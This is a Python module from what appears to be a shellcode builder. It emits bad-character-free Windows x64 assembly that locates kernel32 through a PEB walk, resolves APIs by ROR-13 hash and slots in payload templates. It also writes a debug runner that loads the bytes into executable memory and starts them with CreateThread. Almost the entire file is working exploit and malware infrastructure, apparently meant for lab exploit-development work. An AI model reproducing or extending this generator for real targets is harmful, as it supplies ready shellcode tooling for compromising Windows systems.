"""x64 assembly build pipeline: compose full x64 shellcode assembly.

Generates position-independent Windows x64 shellcode using:
  - GS:[0x60] PEB access
  - PE32+ export directory parsing
  - Microsoft x64 calling convention
  - RSP-relative stack frame (no frame pointer)

Entry state assumptions:
  - RSP is 8-byte aligned (misaligned from 16-byte boundary, standard after CALL)
  - No register contents assumed
  - Execution starts at _start label
"""
from __future__ import annotations

import os
from datetime import UTC, datetime

from .api_database import API_DATABASE, MODULE_LOAD_ORDER
from .encode_x64 import (
    encode_dword_into_r64,
    safe_call_mem_x64,
    safe_lea_x64,
    safe_mem_load_x64,
    safe_qword_store,
)
from .payload_templates.base import PayloadTemplate, TemplateConfig
from .schema import Manifest
from .stack_alloc_x64 import StackLayoutX64
from .strings import emit_push, to_dwords


def _build_timestamp() -> str:
    epoch = os.environ.get("SOURCE_DATE_EPOCH", "0")
    if epoch.lower() == "now":
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dt = datetime.fromtimestamp(int(epoch), tz=UTC)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


def _emit_framework_stubs_x64(badchars: set[int]) -> str:
    """Generate x64 PEB-walk and export resolution framework stubs.

    x64 PEB access: GS:[0x60]
    x64 PE32+: export directory at PE+0x88 (data directory index 0)
    InInitializationOrderModuleList is at PEB_LDR_DATA+0x30
    Module base at LDR_DATA_TABLE_ENTRY+0x20 (DllBase, InInitOrder)
    BaseDllName at +0x48 (InInitOrder offset)
    """
    lines: list[str] = []

    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
    lines.append("get_first_ldr_entry:")
    lines.append("    xor  ecx, ecx")
    lines.append("    mov  rax, gs:[rcx + 0x60]")
    lines.extend(safe_mem_load_x64("rax", "rax", 0x18, badchars))
    lines.extend(safe_mem_load_x64("rax", "rax", 0x30, badchars))
    lines.append("    sub  rax, 0x10")
    lines.append("    ret")
    lines.append("")

    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL (UTF-16LE)
    lines.append("find_kernel32_entry:")
    lines.extend(safe_mem_load_x64("rsi", "rax", 0x48, badchars))
    lines.append("    cmp  word ptr [rsi], 0x004b")
    lines.append("    jne  next_module")
    lines.append("    cmp  word ptr [rsi+2], 0x0045")
    lines.append("    jne  next_module")
    lines.append("    cmp  word ptr [rsi+12], 0x0033")
    lines.append("    jne  next_module")
    lines.extend(safe_mem_load_x64("rbx", "rax", 0x20, badchars))
    lines.append("    ret")
    lines.append("")

    # next_module: advance to next module in list
    lines.append("next_module:")
    lines.extend(safe_mem_load_x64("rax", "rax", 0x10, badchars))
    lines.append("    sub  rax, 0x10")
    lines.append("    jmp  find_kernel32_entry")
    lines.append("")

    # find_module: entry point for PEB walk
    lines.append("find_module:")
    lines.append("    call get_first_ldr_entry")
    lines.append("    jmp  find_kernel32_entry")
    lines.append("")

    # get_export_directory: PE32+ header -> export directory RVA
    # PE signature at [ImageBase + e_lfanew]
    # Export directory RVA at PE + 0x88 (data directories start at 0x70 for PE32+, entry 0 is export)
    lines.append("get_export_directory:")
    lines.append("    mov  eax, dword ptr [rbx + 0x3c]")
    lines.append("    add  rax, rbx")
    lines.append("    mov  eax, dword ptr [rax + 0x88]")
    lines.append("    add  rax, rbx")
    lines.append("    ret")
    lines.append("")

    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
    lines.append("get_export_tables:")
    lines.append("    mov  ecx, dword ptr [rax + 0x18]")
    lines.append("    mov  edi, dword ptr [rax + 0x20]")
    lines.append("    add  rdi, rbx")
    lines.append("    mov  edx, dword ptr [rax + 0x24]")
    lines.append("    add  rdx, rbx")
    lines.append("    mov  esi, dword ptr [rax + 0x1c]")
    lines.append("    add  rsi, rbx")
    lines.append("    ret")
    lines.append("")

    # save_export_context: store to RSP-relative frame
    # Uses fixed offsets in the "export context" area (first 0x40 bytes)
    lines.append("save_export_context:")
    lines.append("    mov  qword ptr [rbp - 0x08], rbx")
    lines.append("    mov  qword ptr [rbp - 0x10], rdi")
    lines.append("    mov  qword ptr [rbp - 0x18], rdx")
    lines.append("    mov  qword ptr [rbp - 0x20], rsi")
    lines.append("    mov  qword ptr [rbp - 0x28], rcx")
    lines.append("    ret")
    lines.append("")

    # compute_hash: ROR-13 hash of null-terminated ASCII string at RSI
    lines.append("compute_hash:")
    lines.append("    xor  eax, eax")
    lines.append("    xor  edx, edx")
    lines.append("    cld")
    lines.append("")
    lines.append("hash_loop:")
    lines.append("    lodsb")
    lines.append("    test al, al")
    lines.append("    jz   hash_done")
    lines.append("    ror  edx, 0x0d")
    lines.append("    movzx eax, al")
    lines.append("    add  edx, eax")
    lines.append("    jmp  hash_loop")
    lines.append("")
    lines.append("hash_done:")
    lines.append("    ret")
    lines.append("")

    # resolve_matched_export: ordinal -> function address (PE32+)
    # AddressOfNameOrdinals entries are 16-bit, AddressOfFunctions entries are 32-bit RVAs
    lines.append("resolve_matched_export:")
    lines.append("    mov  rdx, qword ptr [rbp - 0x18]")
    lines.append("    movzx eax, word ptr [rdx + rcx*2]")
    lines.append("    mov  rsi, qword ptr [rbp - 0x20]")
    lines.append("    mov  eax, dword ptr [rsi + rax*4]")
    lines.append("    mov  rcx, qword ptr [rbp - 0x08]")
    lines.append("    add  rax, rcx")
    lines.append("    ret")
    lines.append("")

    # resolve_export_by_hash: loop through exports comparing hashes
    lines.append("resolve_export_by_hash:")
    lines.append("    mov  qword ptr [rbp - 0x30], rax")
    lines.append("    xor  ecx, ecx")
    lines.append("")
    lines.append("find_export_loop:")
    lines.append("    mov  rdi, qword ptr [rbp - 0x10]")
    lines.append("    mov  eax, dword ptr [rdi + rcx*4]")
    lines.append("    mov  rdi, qword ptr [rbp - 0x08]")
    lines.append("    add  rax, rdi")
    lines.append("    mov  rsi, rax")
    lines.append("    push rcx")
    lines.append("    call compute_hash")
    lines.append("    pop  rcx")
    lines.append("    mov  rax, qword ptr [rbp - 0x30]")
    lines.append("    cmp  edx, eax")
    lines.append("    je   resolve_matched_export")
    lines.append("")
    lines.append("inc_next:")
    lines.append("    inc  ecx")
    lines.append("    mov  eax, dword ptr [rbp - 0x28]")
    lines.append("    cmp  ecx, eax")
    lines.append("    jl   find_export_loop")

    return "\n".join(lines)


def _emit_stack_reserve_x64(frame_size: int, badchars: set[int]) -> list[str]:
    """Emit badchar-safe sub rsp, frame_size."""
    lines = list(encode_dword_into_r64(frame_size, badchars, "r11"))
    lines.append("    sub  rsp, r11")
    return lines


def _dll_load_block_x64(dll: str, manifest: Manifest, layout: StackLayoutX64) -> str:
    """Generate the LoadLibraryA block for a secondary DLL (x64)."""
    loadlib_slot = layout.slot("LoadLibraryA")
    module_slot = layout.slot(dll)

    push_result = emit_push(dll, badchars=manifest.badchars)
    cleanup = len(to_dwords(dll)) * 4
    bc = manifest.badchars

    lines = [
        f"; -- Loading {dll} via LoadLibraryA (x64) --",
        "",
        push_result.asm,
        "    mov  rcx, rsp",
        *safe_call_mem_x64("rsp", loadlib_slot.offset, bc),
        *safe_qword_store("rsp", module_slot.offset, "rax", bc),
        f"    ; {dll} base",
        f"    add  rsp, 0x{cleanup:02x}",
        "",
        *safe_mem_load_x64("rbx", "rsp", module_slot.offset, bc),
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]
    return "\n".join(lines)


def _emit_api_resolution_x64(
    manifest: Manifest, layout: StackLayoutX64, dll: str,
) -> str:
    """Emit hash-based API resolution stubs for a DLL's functions (x64)."""
    from .hash_gen import ror13

    bc = manifest.badchars
    lines: list[str] = []
    module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == dll]

    for func_name in module_funcs:
        h = ror13(func_name)
        slot = layout.slot(func_name)
        lines.append(f"    ; resolve {func_name} (hash 0x{h:08x})")
        lines.extend(encode_dword_into_r64(h, bc, "rax"))
        lines.append("    call resolve_export_by_hash")
        lines.extend(safe_qword_store("rsp", slot.offset, "rax", bc))
        lines.append("")

    return "\n".join(lines)


def _emit_strings_x64(
    manifest: Manifest, layout: StackLayoutX64,
    skip_labels: set[str] | None = None,
) -> str:
    """Emit string construction for x64 (mov-based, into RSP-relative slots)."""
    from .encode_x64 import encode_dword_into_r64, safe_dword_store_x64

    bc = manifest.badchars
    skip = skip_labels or set()
    lines: list[str] = []

    for entry in manifest.strings:
        if entry.label in skip:
            continue
        slot = layout.slot(entry.label)
        raw = entry.value.encode("ascii") + b"\x00"
        base_offset = slot.offset

        lines.append(f"    ; string '{entry.label}' = \"{entry.value}\"")
        lines.append("    xor  eax, eax")

        # Write in 4-byte chunks
        for i in range(0, len(raw), 4):
            chunk = raw[i:i + 4]
            val = int.from_bytes(chunk.ljust(4, b"\x00"), "little")
            if val == 0:
                lines.extend(safe_dword_store_x64("rsp", base_offset + i, "eax", bc))
            else:
                lines.extend(encode_dword_into_r64(val, bc, "r11"))
                lines.extend(safe_dword_store_x64("rsp", base_offset + i, "r11d", bc))

        # Null terminator is already included in the raw bytes
        lines.append("")

    return "\n".join(lines)


def _emit_struct_init_x64(
    manifest: Manifest, layout: StackLayoutX64,
) -> str:
    """Emit structure zero-initialization for x64."""
    from .api_database import STRUCT_DATABASE_X64

    bc = manifest.badchars
    lines: list[str] = []

    seen: set[str] = set()
    for func_name in manifest.functions:
        for struct_name in API_DATABASE[func_name].requires_structs:
            if struct_name in seen:
                continue
            seen.add(struct_name)

            st_rec = STRUCT_DATABASE_X64.get(struct_name)
            if st_rec is None:
                from .api_database import STRUCT_DATABASE
                st_rec = STRUCT_DATABASE.get(struct_name)
            if st_rec is None:
                continue

            slot = layout.slot(struct_name)
            size = st_rec.size
            qwords = size // 8

            lines.append(f"    ; zero {struct_name} (0x{size:x} bytes)")
            lines.append("    xor  eax, eax")
            lines.extend(safe_lea_x64("rdi", "rsp", slot.offset, bc))

            if qwords <= 6:
                for i in range(qwords):
                    lines.extend(safe_qword_store("rdi", i * 8, "rax", bc))
            else:
                lines.append(f"    mov  ecx, 0x{qwords:02x}")
                lines.append("    rep  stosq")

            lines.append("")

    return "\n".join(lines)


def compose_asm_x64(
    manifest: Manifest,
    layout: StackLayoutX64,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full x64 assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"
    bc = config.badchars

    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "[BITS 64]",
        "; AUTO-GENERATED by emitter-v1 (x64)",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {_build_timestamp()}",
        "",
        "    _start:",
        "        jmp _stub_trampoline",
        "",
        "; -- Framework Stubs (x64) --",
        "",
        _emit_framework_stubs_x64(bc),
        "",
        "_stub_trampoline:",
        "    jmp main",
        "",
        "; -- Main (x64) --",
        "",
        "main:",
        "    ; Establish stack frame",
        "    mov  rbp, rsp",
        *_emit_stack_reserve_x64(layout.frame_size, bc),
        "    ; RSP is now 16-byte aligned (entry RSP was 8-mod-16, sub even value)",
        "",
        "    ; Bootstrap: find kernel32 via PEB walk (GS:[0x60])",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    # API resolution per module
    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                raise ValueError(
                    f"Manifest uses APIs from {mi.dll} but does not declare "
                    f"LoadLibraryA. Add LoadLibraryA to the functions list."
                )
            parts.append(_dll_load_block_x64(mi.dll, manifest, layout))

        resolution = _emit_api_resolution_x64(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    # String construction
    parts += [
        "; -- String Construction (x64) --",
        "",
    ]
    str_asm = _emit_strings_x64(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    # Structure initialization
    parts += [
        "; -- Structure Initialization (x64) --",
        "",
    ]
    struct_asm = _emit_struct_init_x64(manifest, layout)
    if struct_asm.strip():
        parts.append(struct_asm)
    else:
        parts += ["; (no structures)", ""]

    # Payload
    parts += [
        "; -- Payload (x64) --",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template - insert payload assembly here)", ""]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


def generate_debug_runner_x64(asm: str) -> str:
    """Generate a self-contained Python debug script for x64 shellcode."""
    asm = asm.replace(";", "#")
    escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Debug runner for emitter-generated x64 shellcode.

Copy this file to the Windows lab VM, then:
  python debug_runner.py

Requires: pip install keystone-engine
This runner assembles 64-bit x64 shellcode. Run it under 64-bit Python.
"""
import ctypes
import sys

from keystone import KS_ARCH_X86, KS_MODE_64, Ks

CODE = r"""
{escaped_asm}
"""


def main():
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    cleaned = CODE.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(encoding)

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Instructions: {{count}}")
    print(f"[+] Shellcode:    {{len(shellcode)}} bytes")
    print(f"[+] Address:      {{ptr:#018x}}")
    print(f"[+] WinDbg:       bp {{ptr:#018x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _emit_contract_md_x64(
    manifest: Manifest, layout: StackLayoutX64, raw: bytes | None,
) -> str:
    """Generate a simplified stack layout contract document for x64."""
    lines = [
        "# Stack Layout (x64)",
        "",
        f"Architecture: x64 (64-bit, Microsoft calling convention)",
        f"Frame: `sub rsp, 0x{layout.frame_size:x}` (0x{layout.frame_size:x} bytes reserved)",
        "",
    ]

    for category in ("module_base", "api", "variable", "structure", "string"):
        slots = layout.slots_by_category(category)
        if not slots:
            continue
        lines.append(f"## {category.replace('_', ' ').title()} Slots")
        lines.append("")
        lines.append("| Offset | Name | Size |")
        lines.append("|--------|------|------|")
        for s in sorted(slots, key=lambda x: x.offset):
            lines.append(f"| `[RSP+0x{s.offset:03x}]` | {s.name} | {s.size} |")
        lines.append("")

    lines.append("## API Table")
    lines.append("")
    lines.append("| Function | Module | Hash |")
    lines.append("|----------|--------|------|")
    from .hash_gen import ror13
    for fn in manifest.functions:
        rec = API_DATABASE[fn]
        h = ror13(fn)
        lines.append(f"| {fn} | {rec.module} | `0x{h:08x}` |")
    lines.append("")

    if raw:
        lines.append(f"## Shellcode: {len(raw)} bytes")
        lines.append("")

    return "\n".join(lines)


def build_x64(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
) -> "BuildResult":
    """Run the full x64 build pipeline. Returns a BuildResult (same shape as x86).

    Mirrors build.build() but uses x64 stack allocator, x64 framework stubs,
    and x64 compose pipeline.
    """
    from .build import (
        BuildResult,
        _load_template,
        _merge_template_requirements,
        _apply_config_overrides,
        _bytes_to_c,
        _bytes_to_hex_str,
        _bytes_to_py,
    )
    from .schema import load as load_manifest
    from .stack_alloc_x64 import build_layout_x64
    from .workflow.ir import CallAPI
    from .workflow.reference import WorkflowTemplate

    manifest = load_manifest(manifest_path)
    config = config or TemplateConfig(arch="x64")
    config.arch = "x64"
    config.badchars = manifest.badchars

    manifest = _apply_config_overrides(manifest, config)

    effective_template = template_name or manifest.template
    template = _load_template(effective_template) if effective_template else None

    extra_structs: list[str] | None = None
    max_stack_args = 0

    if template is not None:
        manifest = _merge_template_requirements(manifest, template, config)
        if isinstance(template, WorkflowTemplate):
            struct_map = template.probe_structs(config)
            extra_structs = list(struct_map.values())
            wf = template._resolve_workflow(config)
            max_args = max(
                (len(op.arguments) for b in wf.blocks for op in b.operations if isinstance(op, CallAPI)),
                default=0,
            )
            max_stack_args = max(max_args - 4, 0)

    layout = build_layout_x64(manifest, extra_structs=extra_structs, max_stack_args=max_stack_args)
    asm = compose_asm_x64(manifest, layout, manifest_path, template, config)

    raw: bytes | None = None
    assembler: str | None = None
    asm_errors: list[str] = []

    if assemble:
        try:
            import keystone
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
            from .build import _strip_comments
            encoding, _ = ks.asm(_strip_comments(asm))
            raw = bytes(encoding)
            assembler = "keystone-x64"
        except ImportError:
            asm_errors.append("keystone not available; skipping x64 assembly")
        except Exception as e:
            asm_errors.append(f"keystone-x64: {e}")

    contract_md = _emit_contract_md_x64(manifest, layout, raw)

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=raw,
        hex_str=_bytes_to_hex_str(raw) if raw else None,
        py_bytes=_bytes_to_py(raw) if raw else None,
        c_array=_bytes_to_c(raw) if raw else None,
        debug_runner=generate_debug_runner_x64(asm),
        layout=layout,
        assembler=assembler,
        asm_errors=asm_errors if asm_errors else None,
    )
